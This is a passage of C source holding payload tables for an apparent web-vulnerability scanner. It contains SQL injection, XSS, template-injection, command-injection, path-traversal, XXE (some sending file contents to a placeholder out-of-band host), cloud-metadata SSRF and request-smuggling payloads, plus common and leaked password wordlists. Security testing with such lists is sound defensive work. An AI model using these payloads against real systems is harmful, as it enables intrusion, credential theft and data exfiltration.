-biases\nwandb\ncometml\ncomet-ml\ncomet_ml\nsagemaker\nvertexai\nvertex-ai\nvertex_ai\nazureml\nazure-ml\nazure_ml\ndatabricks-mlflow\nopenai\nopen-ai\nopen_ai\nanthropic\ncohere\nai21\nstability\nstability-ai\nstabilityai\nstable-diffusion\nstablediffusion\nmidjourney\nrunway\nrunwayml\ndalle\ndalle2\ndalle3\nhuggingface\nhugging-face\nhugging_face\nhf\nspaces\ngradio\nstreamlit\ndash\ndashapp\nplotly\nsuperset\nmetabase\nlooker\ntableau\npowerbi\nquicksight\nsisense\ndomo\nthoughtspot\nthoughtspotcloud\nthoughtspot-cloud\nsap\ndynamics\nworkday\nservicenow\nsalesforce\nmarketo\nhubspot\nintercom\nzendesk\nfreshdesk\ndrift\ncalendly\nzapline\ncustomerio\nsendgrid\nmailgun\npostmark\nmandrill\nmailchimp\nsendinblue\ncampaignmonitor\ncampaign-monitor\ncampaign_monitor\namazonses\nses\namazon-ses\namazon_ses\naws-ses\naws_ses\nsmsgateway\nsms-gateway\nsms_gateway\ntwilio\nvonage\nnexmo\nplivo\nmessagebird\nsignal\nwhatsapp\nwa\nwa-business\nwa_business\nwabusiness\ntelegram\ntg\nviber\nline\nwechat\nweixin\nqq\nkakaotalk\nkakao\nteams1\nteams2\nslack1\nslack2\nzoom1\nzoom2\nwebex1\nwebex2\nmeet1\nmeet2\nrooms\nroom1\nroom2\nroom3\nconference\nconf\nconferencing\nmeeting\nmeetings\nvoice\nvideo\nvideoconf\nvideo-conf\nvideo_conf\nvoip\nvoice-over-ip\nvoice_over_ip\nsipx\nsippx\nsippx1\nsippx2\nsipy\nsippy\nsippy1\nsippy2\nfreepbx1\nfreepbx2\n3cx1\n3cx2\nasterisk1\nasterisk2\nturnserver1\nturnserver2\nstun-server\nstun_server\nstunserver\nturn-server\nturn_server\nturnserver\nstun-srv\nstun_srv\nstunsrv\nturn-srv\nturn_srv\nturnsrv\nbacker\nbackend\nback-end\nback_end\nfrontend\nfront-end\nfront_end\nmiddleware\nmsg\nmessage\nmessages\nmessaging\nqueue\nqueues\njobs\nworker\nworkers\nbatch\nbatch-job\nbatch_job\nbatchjob\nbatch-worker\nbatch_worker\nbatchworker\ncron\ncrons\nscheduler\nschedulers\nscheduled\nrouter1-prod\nrouter2-prod\nrouter1-stg\nrouter2-stg\nrouter1-dev\nrouter2-dev\nrouter1-uat\nrouter2-uat\nrouter1-qa\nrouter2-qa\nrouter1-prod-1\nrouter1-prod-2\nrouter1-prod-3\nrouter1-stg-1\nrouter1-stg-2\nrouter1-dev-1\nrouter1-dev-2\nrouter1-uat-1\nrouter1-uat-2\nrouter1-qa-1\nrouter1-qa-2\nrouter1.prod\nrouter2.prod\nrouter1.stg\nrouter2.stg\nrouter1.dev\nrouter2.dev\nrouter1.uat\nrouter2.uat\nrouter1.qa\nrouter2.qa\nrouter1.prod.1\nrouter1.prod.2\nrouter1.prod.3\nrouter1.stg.1\nrouter1.stg.2\nrouter1.dev.1\nrouter1.dev.2\nrouter1.uat.1\nrouter1.uat.2\nrouter1.qa.1\nrouter1.qa.2\n";

static const char* kFuzzdbExtensions =
    ".php\n.php3\n.php4\n.php5\n.php7\n.phtml\n.phps\n.phar\n.asp\n.aspx\n.ashx\n.asmx\n.cer\n.svc\n.vbs\n.jsp\n.jspx\n.do\n.action\n.cfm\n.cfml\n.cgi\n.pl\n.py\n.rb\n.go\n.rs\n.sh\n.bash\n.ksh\n.zsh\n.bat\n.cmd\n.ps1\n.psm1\n.vb\n.exe\n.com\n.scr\n.dll\n.so\n.dylib\n.a\n.lib\n.jar\n.war\n.ear\n.apk\n.ipa\n.deb\n.rpm\n.pkg\n.msi\n.zip\n.tar\n.tar.gz\n.tgz\n.bz2\n.tar.bz2\n.7z\n.rar\n.gz\n.xz\n.lz\n.lzma\n.zst\n.bak\n.bak1\n.bak2\n.bak~\n.bakup\n.old\n.orig\n.original\n.save\n.swp\n.swo\n.swn\n.tmp\n.temp\n.test\n.dev\n.stg\n.prod\n.uat\n.qa\n.beta\n.alpha\n.rc\n~\n.gitignore\n.gitattributes\n.htaccess\n.htpasswd\n.DS_Store\n.env\n.env.local\n.env.dev\n.env.development\n.env.prod\n.env.production\n.env.staging\n.env.stage\n.env.test\n.env.example\n.env.sample\n.env.template\n.env.bak\n.env.save\n.env.old\n.env.orig\n.config\n.cnf\n.ini\n.conf\n.cfg\n.toml\n.yml\n.yaml\n.xml\n.json\n.jsonc\n.csv\n.tsv\n.txt\n.md\n.markdown\n.log\n.logs\n.html\n.htm\n.xhtml\n.shtml\n.shtm\n.dhtml\n.htmls\n.sql\n.sqlite\n.sqlite3\n.db\n.db3\n.mdb\n.accdb\n.dat\n.dump\n.pgsql\n.psql\n.bz2.sql\n.tar.sql\n.gz.sql\n.zip.sql\n.session\n.sessions\n.cache\n.lock\n.pid\n.sock\n.socket\n.fifo\n.pipe\n.git\n.svn\n.hg\n.bzr\n.cvs\n.darcs\n.fossil\n.git/HEAD\n.git/config\n.git/index\n.git/logs/HEAD\n.svn/entries\n.hg/store/00manifest.i\n";

static const char* kHeadersSec =
    "Strict-Transport-Security\n"
    "Content-Security-Policy\n"
    "X-Content-Type-Options\n"
    "X-Frame-Options\n"
    "X-XSS-Protection\n"
    "Referrer-Policy\n"
    "Permissions-Policy\n"
    "Feature-Policy\n"
    "Cross-Origin-Opener-Policy\n"
    "Cross-Origin-Embedder-Policy\n"
    "Cross-Origin-Resource-Policy\n"
    "Cache-Control\n"
    "Pragma\n"
    "Expires\n"
    "Public-Key-Pins\n"
    "Public-Key-Pins-Report-Only\n"
    "Expect-CT\n"
    "Expect-Staple\n"
    "Server\n"
    "X-Powered-By\n"
    "X-AspNet-Version\n"
    "X-AspNetMvc-Version\n"
    "Set-Cookie\n"
    "Origin-Agent-Cluster\n"
    "Clear-Site-Data\n"
    "Sec-Fetch-Site\n"
    "Sec-Fetch-Mode\n"
    "Sec-Fetch-User\n"
    "Sec-Fetch-Dest\n"
    "Sec-CH-UA\n"
    "Sec-CH-UA-Mobile\n"
    "Sec-CH-UA-Platform\n"
    "Access-Control-Allow-Origin\n"
    "Access-Control-Allow-Credentials\n"
    "Access-Control-Allow-Methods\n"
    "Access-Control-Allow-Headers\n"
    "Access-Control-Expose-Headers\n"
    "Access-Control-Max-Age\n"
    ;

static const char* kSqliErrorBased =
    "'\n"
    "\"\n"
    "`\n"
    "' OR '1'='1\n"
    "\" OR \"1\"=\"1\n"
    "' OR 1=1--\n"
    "' OR 1=1#\n"
    "' OR 1=1/*\n"
    "' AND extractvalue(1, concat(0x7e, version()))-- -\n"
    "' AND updatexml(1, concat(0x7e, version(), 0x7e), 1)-- -\n"
    "' AND 1=CONVERT(int,@@version)--\n"
    "' AND CAST((SELECT @@version) AS int)--\n"
    "1' AND extractvalue(rand(),concat(0x3a,(SELECT user())))-- -\n"
    "1 AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1))\n"
    "1' AND 1=cast(version() as integer)--\n"
    "1' AND 1=cast((SELECT current_database()) as integer)--\n"
    "1' AND 1=CAST(sqlite_version() AS INTEGER)--\n"
    "'))\n"
    "')))\n"
    ;

static const char* kSqliBooleanTrue =
    "' AND '1'='1\n"
    "1 AND 1=1\n"
    "' OR 'a'='a' --\n"
    "1) AND 1=1--\n"
    "1)) AND 1=1--\n"
    "' AND LENGTH(database())>0--\n"
    "' AND ASCII(SUBSTRING(@@version,1,1))>0--\n"
    "' AND EXISTS(SELECT 1)--\n"
    "' OR NOT '1'='2\n"
    "1 AND (SELECT COUNT(*) FROM information_schema.tables)>=0--\n"
    "1 AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1--\n"
    ;

static const char* kSqliBooleanFalse =
    "' AND '1'='2\n"
    "1 AND 1=2\n"
    "' OR 'a'='b' --\n"
    "1) AND 1=2--\n"
    "1)) AND 1=2--\n"
    "' AND LENGTH(database())<0--\n"
    "' AND ASCII(SUBSTRING(@@version,1,1))<0--\n"
    "' AND NOT EXISTS(SELECT 1)--\n"
    "' AND 'a'='b\n"
    "1 AND (SELECT COUNT(*) FROM information_schema.tables)<0--\n"
    "1 AND (SELECT CASE WHEN (1=2) THEN 1 ELSE 0 END)=1--\n"
    ;

static const char* kSqliUnionBased =
    "' UNION SELECT NULL--\n"
    "' UNION SELECT NULL,NULL--\n"
    "' UNION SELECT NULL,NULL,NULL--\n"
    "' UNION ALL SELECT NULL,NULL,NULL--\n"
    "1 UNION SELECT NULL--\n"
    "1 UNION SELECT NULL,NULL--\n"
    "1 UNION SELECT NULL,NULL,NULL--\n"
    "' UNION SELECT @@version,NULL--\n"
    "' UNION SELECT version(),NULL--\n"
    "' UNION SELECT sqlite_version(),NULL--\n"
    "' UNION SELECT banner,NULL FROM v$version--\n"
    "' UNION SELECT table_name,NULL FROM information_schema.tables--\n"
    "' UNION SELECT column_name,NULL FROM information_schema.columns--\n"
    "' ORDER BY 1--\n"
    "' ORDER BY 2--\n"
    "' ORDER BY 3--\n"
    ;

static const char* kSqliTimeBased =
    "' AND SLEEP(5)-- -\n"
    "' OR SLEEP(5)-- -\n"
    "'; SELECT SLEEP(5)-- -\n"
    "1 AND IF(1=1, SLEEP(5), 0)-- -\n"
    "1; SELECT pg_sleep(5)--\n"
    "1 AND pg_sleep(5)--\n"
    "1'; WAITFOR DELAY '0:0:5'--\n"
    "1; WAITFOR DELAY '0:0:5'--\n"
    "1' AND BENCHMARK(5000000,MD5('a'))-- -\n"
    "1' AND dbms_pipe.receive_message(('a'),5)-- -\n"
    "1' AND randomblob(500000000)--\n"
    ;

static const char* kSqliWafBypass =
    "/**/OR/**/1=1--\n"
    "'/**/OR/**/'1'='1\n"
    "'%09OR%091=1--\n"
    "'%0aOR%0a1=1--\n"
    "'/*!50000OR*/1=1--\n"
    "' oR '1'='1\n"
    "'%23%0aOR%0a1=1\n"
    "'||(SELECT 1)--\n"
    "' OR 'x' LIKE 'x\n"
    "' UNION/**/SELECT/**/NULL,NULL--\n"
    "'%55nion%20%53elect%20NULL--\n"
    "1 AND/**/IF(1=1,SLEEP(5),0)--\n"
    ;

static const char* kSqliDbFingerprint =
    "@@version\n"
    "version()\n"
    "sqlite_version()\n"
    "banner FROM v$version\n"
    "db_name()\n"
    "current_database()\n"
    "database()\n"
    "user()\n"
    "current_user\n"
    "information_schema.tables\n"
    "pg_catalog.pg_tables\n"
    "sys.databases\n"
    "all_tables\n"
    "sqlite_master\n"
    ;

static const char* kXssHtmlContext =
    "<svg onload=alert(1)>\n"
    "<img src=x onerror=alert(1)>\n"
    "<details open ontoggle=alert(1)>\n"
    "<marquee onstart=alert(1)>\n"
    "<video><source onerror=alert(1)>\n"
    "<math><mtext><table><mglyph><svg><mtext><textarea><img src=x onerror=alert(1)>\n"
    "</title><svg/onload=alert(1)>\n"
    "</textarea><svg/onload=alert(1)>\n"
    "</style><svg/onload=alert(1)>\n"
    "<iframe srcdoc=\"<svg onload=alert(1)>\"></iframe>\n"
    ;

static const char* kXssAttributeContext =
    "\" autofocus onfocus=alert(1) x=\"\n"
    "' autofocus onfocus=alert(1) x='\n"
    "\" onmouseover=alert(1) x=\"\n"
    "' onmouseover=alert(1) x='\n"
    "\" onerror=alert(1) src=x x=\"\n"
    "' onerror=alert(1) src=x x='\n"
    "\" formaction=javascript:alert(1) x=\"\n"
    "' formaction=javascript:alert(1) x='\n"
    "\" style=animation-name:rotation onanimationstart=alert(1) x=\"\n"
    "\" accesskey=x onclick=alert(1) x=\"\n"
    ;

static const char* kXssScriptContext =
    "';alert(1);//\n"
    "\";alert(1);//\n"
    "`;alert(1);//\n"
    "</script><script>alert(1)</script>\n"
    "\\'-alert(1)-\\'\n"
    "\\\"-alert(1)-\\\"\n"
    "${alert(1)}\n"
    "${constructor.constructor('alert(1)')()}\n"
    "');Function('alert(1)')();//\n"
    "\");setTimeout('alert(1)',0);//\n"
    ;

static const char* kXssUrlContext =
    "javascript:alert(1)\n"
    "javascript://%0aalert(1)\n"
    "data:text/html,<script>alert(1)</script>\n"
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\n"
    "JaVaScRiPt:alert(1)\n"
    "javascript:eval('alert(1)')\n"
    "javascript:/*-/*`/*\\`/*'/*\"/**/(alert(1))//\n"
    "//example.invalid/%0d%0aLocation:%20javascript:alert(1)\n"
    ;

static const char* kXssPolyglotExpanded =
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"`/+/onmouseover=1/+/[*/[]/+alert(1)//'>\n"
    "\"><svg/onload=alert(1)//\n"
    "'><svg/onload=alert(1)//\n"
    "</title></style></textarea><svg/onload=alert(1)>\n"
    "<math><mtext><table><mglyph><svg><mtext><textarea><a title=\"</textarea><img src=x onerror=alert(1)>\">\n"
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>\n"
    "<svg><set onbegin=alert(1) attributeName=x to=y>\n"
    "<svg><foreignObject><body xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert(1)</script>\n"
    "<x onclick=alert(1) onkeydown=alert(1) onmouseover=alert(1)>x</x>\n"
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">\n"
    ;

static const char* kXssCspBypass =
    "<script nonce=AIDA_MARKER>alert(1)</script>\n"
    "<script src=//example.invalid/aida.js></script>\n"
    "<link rel=preload as=script href=//example.invalid/aida.js onload=alert(1)>\n"
    "<object data=data:text/html,<script>alert(1)</script>>\n"
    "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>\n"
    "<base href=javascript:alert(1);//><a href=/x>click</a>\n"
    "<form action=javascript:alert(1)><button>go</button></form>\n"
    "<meta http-equiv=refresh content=\"0;javascript:alert(1)\">\n"
    ;

static const char* kXssWafBypass =
    "<svg/onload=alert`1`>\n"
    "<img src=x onerror=confirm?.(1)>\n"
    "<img src=x onerror=window['al'+'ert'](1)>\n"
    "<script>top['al'+'ert'](1)</script>\n"
    "<scr<script>ipt>alert(1)</scr</script>ipt>\n"
    "%3Csvg%2Fonload%3Dalert(1)%3E\n"
    "&lt;svg/onload=alert(1)&gt;\n"
    "<svg><script>123<a>alert(1)</script></svg>\n"
    "<iframe src=java&#x09;script:alert(1)>\n"
    "<IMG SRC=jav&#x0A;ascript:alert(1)>\n"
    ;

static const char* kAuthUsernamesCommonExpanded =
    "admin\nadministrator\nroot\nuser\ntest\nguest\nsupport\nservice\noperator\nmanager\nweb\nwww\napp\napi\ndev\ndeveloper\nqa\nstaging\nprod\nproduction\nbackup\nsysadmin\nsuperadmin\nsecurity\nhelpdesk\nbilling\nsales\nfinance\nhr\nlegal\nops\ndevops\nsre\ndba\ndatabase\noracle\npostgres\nmysql\nmssql\nredis\nmongo\nelastic\njenkins\ngitlab\njira\nconfluence\nokta\nauth0\nvpn\nfirewall\nrouter\nswitch\nprinter\nscanner\npos\nkiosk\nmobile\nandroid\nios\ncustomer\nclient\npartner\nvendor\nemployee\ncontractor\nintern\ntemp\nvisitor\nanonymous\npublic\nshared\nbreakglass\nemergency\nsetup\ninstaller\n"
    "admin@example.com\nadministrator@example.com\nroot@example.com\nsupport@example.com\nservice@example.com\nsecurity@example.com\nhelpdesk@example.com\nsales@example.com\nfinance@example.com\nhr@example.com\nit@example.com\nops@example.com\ndevops@example.com\nsre@example.com\nwebmaster@example.com\npostmaster@example.com\nhostmaster@example.com\n"
    ;

static const char* kAuthPasswordsCommonExpanded =
    "password\nPassword1\nPassword123\nP@ssw0rd\nP@ssw0rd1\nP@ssw0rd!\nadmin\nadmin123\nadmin@123\nroot\nroot123\nuser\nuser123\ntest\ntest123\nguest\nguest123\nwelcome\nWelcome1\nWelcome123\nchangeme\nchangeit\ndefault\nletmein\nqwerty\nqwerty123\nabc123\n123456\n12345678\n123456789\n1234567890\n111111\n000000\niloveyou\nmonkey\ndragon\nmaster\nsunshine\nfootball\nbaseball\ntrustno1\ncompany123\nCompany123\nCompany2024\nSpring2024\nSummer2024\nWinter2024\nAutumn2024\nFall2024\n"
    "oracle\noracle123\nmysql\nmysql123\npostgres\npostgres123\nsqlserver\nsqlserver123\nredis\nredis123\nmongodb\nmongodb123\njenkins\njenkins123\ngitlab\ngitlab123\njira\njira123\nconfluence\nconfluence123\nvpn\nvpn123\nfirewall\nfirewall123\nrouter\nrouter123\nswitch\nswitch123\nbackup\nbackup123\n"
    ;

static const char* kAuthPasswordsRockyou =
    "123456\n12345\n123456789\npassword\niloveyou\nprincess\n1234567\nrockyou\n12345678\nabc123\nnicole\ndaniel\nbabygirl\nmonkey\nlovely\njessica\n654321\nmichael\nashley\nqwerty\n111111\niloveu\n000000\nmichelle\ntigger\nsunshine\nchocolate\npassword1\nsoccer\nanthony\nfriends\nbutterfly\npurple\nangel\njordan\nliverpool\njustin\nloveme\nfuckyou\n123123\nfootball\nsecret\nandrea\ncarlos\njennifer\njoshua\nbubbles\n1234567890\nsuperman\nhannah\namanda\nloveyou\npretty\nbasketball\nandrew\nangels\ntweety\nflower\nplayboy\nhello\nelizabeth\nhottie\ntinkerbell\ncharlie\nsamantha\nbarbie\nchelsea\nlovers\nteamo\njasmine\nbrandon\n666666\nshadow\nmelissa\neminem\nmatthew\nrobert\ndanielle\nforever\nfamily\njonathan\n987654321\ncomputer\nwhatever\ndragon\nvanessa\ncookie\nnaruto\nsummer\nsweety\nspongebob\njoseph\njunior\nsoftball\ntaylor\nyellow\ndaniela\nlauren\nmickey\nprincesa\nalexandra\nalexis\njesus\nestrella\nmiguel\nwilliam\nthomas\nbeautiful\nmylove\nangela\npoohbear\npatrick\niloveme\nsakura\nadrian\nalexander\ndestiny\nchristian\n121212\nsayang\namerica\ndancer\nmonica\nrichard\n112233\nprincess1\n555555\n"
    ;

static const char* kSsrfInternalUrls =
    "http://localhost/\n"
    "http://127.0.0.1/\n"
    "http://127.1/\n"
    "http://0/\n"
    "http://0.0.0.0/\n"
    "http://[::1]/\n"
    "http://2130706433/\n"
    "http://0x7f000001/\n"
    "http://0177.0.0.1/\n"
    "http://127.0.0.1:22/\n"
    "http://127.0.0.1:80/\n"
    "http://127.0.0.1:443/\n"
    "http://127.0.0.1:3306/\n"
    "http://127.0.0.1:5432/\n"
    "http://127.0.0.1:6379/\n"
    "http://127.0.0.1:9200/\n"
    "http://127.0.0.1:11211/\n"
    "http://127.0.0.1:27017/\n"
    "http://10.0.0.1/\n"
    "http://10.10.10.10/\n"
    "http://172.16.0.1/\n"
    "http://192.168.0.1/\n"
    "http://192.168.1.1/\n"
    "http://169.254.169.254/\n"
    "gopher://127.0.0.1:6379/_INFO\n"
    "dict://127.0.0.1:11211/stats\n"
    "file:///etc/passwd\n"
    "file:///c:/windows/win.ini\n"
    ;

static const char* kSsrfCloudMetadataExpanded =
    "http://169.254.169.254/latest/meta-data/\n"
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
    "http://169.254.169.254/latest/user-data/\n"
    "http://169.254.169.254/latest/dynamic/instance-identity/document\n"
    "http://169.254.170.2/v2/credentials/\n"
    "http://metadata.google.internal/computeMetadata/v1/\n"
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n"
    "http://metadata/computeMetadata/v1/instance/service-accounts/default/token\n"
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01\n"
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\n"
    "http://100.100.100.200/latest/meta-data/\n"
    "http://169.254.169.254/opc/v1/instance/\n"
    "http://169.254.169.254/openstack/latest/meta_data.json\n"
    "http://169.254.169.254/metadata/v1/id\n"
    "http://192.0.0.192/latest/meta-data/\n"
    "http://[::ffff:169.254.169.254]/latest/meta-data/\n"
    "http://2852039166/latest/meta-data/\n"
    "http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/\n"
    "http://169.254.169.254.nip.io/latest/meta-data/\n"
    ;

static const char* kSstiJinja2 =
    "{{7*7}}\n"
    "{{7*'7'}}\n"
    "{{config}}\n"
    "{{config.items()}}\n"
    "{{request}}\n"
    "{{self}}\n"
    "{{cycler.__init__.__globals__.os.popen('id').read()}}\n"
    "{{joiner.__init__.__globals__.os.popen('id').read()}}\n"
    "{{namespace.__init__.__globals__.os.popen('id').read()}}\n"
    "{{''.__class__.__mro__[1].__subclasses__()}}\n"
    ;

static const char* kSstiTwig =
    "{{7*7}}\n"
    "{{7*'7'}}\n"
    "{{_self}}\n"
    "{{app.request}}\n"
    "{{['id']|filter('system')}}\n"
    "{{['cat /etc/passwd']|filter('system')}}\n"
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}\n"
    ;

static const char* kSstiFreemarker =
    "${7*7}\n"
    "${7*'7'}\n"
    "${.version}\n"
    "${product.getClass()}\n"
    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}\n"
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}\n"
    "${object.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")}\n"
    ;

static const char* kSstiVelocity =
    "#set($x=7*7)$x\n"
    "#set($e=\"\")$e.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")\n"
    "#foreach($i in [1..3])$i#end\n"
    "$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\")\n"
    "${7*7}\n"
    ;

static const char* kSstiSmarty =
    "{7*7}\n"
    "{$smarty.version}\n"
    "{php}echo `id`;{/php}\n"
    "{if phpinfo()}{/if}\n"
    "{system('id')}\n"
    "{fetch file='/etc/passwd'}\n"
    ;

static const char* kSstiDetect =
    "{{7*7}}\n"
    "${7*7}\n"
    "#{7*7}\n"
    "*{7*7}\n"
    "{7*7}\n"
    "<%= 7*7 %>\n"
    "{{=7*7}}\n"
    "@{7*7}\n"
    "[[${7*7}]]\n"
    "[(${7*7})]\n"
    ;

static const char* kCmdiUnixAdvanced =
    "; id\n"
    "| id\n"
    "&& id\n"
    "|| id\n"
    "`id`\n"
    "$(id)\n"
    "%0aid\n"
    "%0a/bin/sh -c id\n"
    ";${IFS}id\n"
    "{cat,/etc/passwd}\n"
    "/???/c?t /etc/passwd\n"
    "; sleep 5\n"
    "| sleep 5\n"
    "$(sleep 5)\n"
    "; ping -c 5 127.0.0.1\n"
    ;

static const char* kCmdiWindowsAdvanced =
    "& whoami\n"
    "&& whoami\n"
    "| whoami\n"
    "|| whoami\n"
    "%0d%0a whoami\n"
    "& cmd /c whoami\n"
    "& cmd.exe /c whoami\n"
    "& powershell -NoProfile -Command whoami\n"
    "& powershell -enc dwBoAG8AYQBtAGkA\n"
    "& type c:\\windows\\win.ini\n"
    "& ping -n 5 127.0.0.1\n"
    "& timeout /t 5\n"
    "& choice /d y /t 5 > nul\n"
    ;

static const char* kCmdiFilterBypass =
    "%0aid\n"
    "%0d%0aid\n"
    "%26%26id\n"
    "%7Cid\n"
    "%3Bid\n"
    "i\\d\n"
    "i${IFS}d\n"
    "w'h'o'a'm'i\n"
    "w\"h\"o\"a\"m\"i\n"
    "who^ami\n"
    "wh^oami\n"
    "cmd,/c,whoami\n"
    "{echo,AIDA_CMDI}\n"
    "`echo AIDA_CMDI`\n"
    "$(echo AIDA_CMDI)\n"
    ;

static const char* kPathTraversalUnixAdvanced =
    "/etc/passwd\n"
    "../etc/passwd\n"
    "../../etc/passwd\n"
    "../../../etc/passwd\n"
    "../../../../etc/passwd\n"
    "../../../../../../etc/passwd\n"
    "../../../../../../../../etc/passwd\n"
    "/proc/self/environ\n"
    "/proc/self/cmdline\n"
    "/proc/self/status\n"
    "/proc/version\n"
    "/var/log/auth.log\n"
    "/var/log/nginx/access.log\n"
    "/var/log/apache2/access.log\n"
    "php://filter/convert.base64-encode/resource=/etc/passwd\n"
    "php://filter/read=convert.base64-encode/resource=index.php\n"
    "file:///etc/passwd\n"
    ;

static const char* kPathTraversalWindowsAdvanced =
    "C:\\windows\\win.ini\n"
    "C:\\boot.ini\n"
    "..\\windows\\win.ini\n"
    "..\\..\\windows\\win.ini\n"
    "..\\..\\..\\windows\\win.ini\n"
    "..\\..\\..\\..\\windows\\win.ini\n"
    "..\\..\\..\\..\\..\\windows\\win.ini\n"
    "C:\\windows\\system32\\drivers\\etc\\hosts\n"
    "C:\\windows\\repair\\sam\n"
    "C:\\windows\\system.ini\n"
    "C:\\windows\\panther\\unattend.xml\n"
    "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_extend.log\n"
    "C:\\windows\\system32\\inetsrv\\config\\applicationHost.config\n"
    ;

static const char* kPathTraversalEncodingBypass =
    "..%2f..%2f..%2fetc%2fpasswd\n"
    "..%252f..%252f..%252fetc%252fpasswd\n"
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd\n"
    "....//....//....//etc/passwd\n"
    "....\\/....\\/....\\/etc/passwd\n"
    "..%c0%af..%c0%afetc%c0%afpasswd\n"
    "..%5c..%5c..%5cwindows%5cwin.ini\n"
    "..%255c..%255c..%255cwindows%255cwin.ini\n"
    "%2e%2e%5c%2e%2e%5cwindows%5cwin.ini\n"
    "/etc/passwd%00\n"
    "C:\\windows\\win.ini%00\n"
    ;

static const char* kXxeOob =
    "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY % dtd SYSTEM \"http://AIDA_OOB/aida.dtd\">%dtd;]><root>aida</root>\n"
    "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY xxe SYSTEM \"http://AIDA_OOB/xxe\">]><root>&xxe;</root>\n"
    "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://AIDA_OOB/?x=%file;\">%dtd;]><root>aida</root>\n"
    "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY % file SYSTEM \"file:///c:/windows/win.ini\"><!ENTITY % dtd SYSTEM \"http://AIDA_OOB/?x=%file;\">%dtd;]><root>aida</root>\n"
    ;

static const char* kXxeErrorBased =
    "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>\n"
    "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><root>&xxe;</root>\n"
    "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">%xxe;]><root>aida</root>\n"
    "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><root>&xxe;</root>\n"
    ;

static const char* kXxeSsrf =
    "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>\n"
    "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY xxe SYSTEM \"http://metadata.google.internal/computeMetadata/v1/\">]><root>&xxe;</root>\n"
    "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY xxe SYSTEM \"http://127.0.0.1:80/\">]><root>&xxe;</root>\n"
    "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY xxe SYSTEM \"http://localhost:8080/\">]><root>&xxe;</root>\n"
    ;

static const char* kSmugglingClTe =
    "POST / HTTP/1.1\\r\\nHost: AIDA_HOST\\r\\nContent-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nG\n"
    "POST / HTTP/1.1\\r\\nHost: AIDA_HOST\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nX\n"
    "POST / HTTP/1.1\\r\\nHost: AIDA_HOST\\r\\nContent-Length: 11\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /x\n"
    ;

static const char* kSmugglingTeCl =
    "POST / HTTP/1.1\\r\\nHost: AIDA_HOST\\r\\nContent-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n5\\r\\nGHOST\\r\\n0\\r\\n\\r\\n\n"
    "POST / HTTP/1.1\\r\\nHost: AIDA_HOST\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n\n"
    "POST / HTTP/1.1\\r\\nHost: AIDA_HOST\\r\\nContent-Length: 0\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nX\\r\\n0\\r\\n\\r\\n\n"
    ;

static const char* kSmugglingTeTe =
    "POST / HTTP/1.1\\r\\nHost: AIDA_HOST\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-Encoding : chunked\\r\\nContent-Length: 4\\r\\n\\r\\n5\\r\\nGHOST\\r\\n0\\r\\n\\r\\n\n"
    "POST / HTTP/1.1\\r\\nHost: AIDA_HOST\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-Encoding: xchunked\\r\\nContent-Length: 4\\r\\n\\r\\n0\\r\\n\\r\\nG\n"
    "POST / HTTP/1.1\\r\\nHost: AIDA_HOST\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-Encoding:\\tchunked\\r\\nContent-Length: 4\\r\\n\\r\\n0\\r\\n\\r\\nG\n"
    ;

static const char* kFuzzCommonParams =
